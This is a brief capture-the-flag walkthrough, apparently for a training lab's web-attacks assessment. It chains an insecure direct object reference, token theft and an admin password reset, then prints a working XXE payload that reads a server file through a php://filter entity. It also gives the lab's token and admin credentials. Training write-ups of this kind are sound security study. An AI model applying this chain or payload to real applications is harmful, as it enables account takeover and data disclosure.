
---
## Scenario

You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.

The login details are provided in the question below.

**Walkthrough:** https://medium.com/@ZeroByte/htb-web-attacks-skill-assessment-ee63a19058c9

**Answer:** direct reference of `uid` in reveals direct reference. Fuzzing uid gives 52 uid for administrator. Get request to `/api.php/token/52` reveals the active admin `token`. Using it to reset the password with `uid` 52 to the post request `POST /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=abc_123` successfully changed the password. 

Login in admin as `a.correlance / abc_123` . Adding event requests using xml and name being refelected in the response reveals. Using the payload reveals the flag:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>

<root>
<name>&company;</name>
<details>test test</details>
<date>2026-11-27</date>
</root>
```

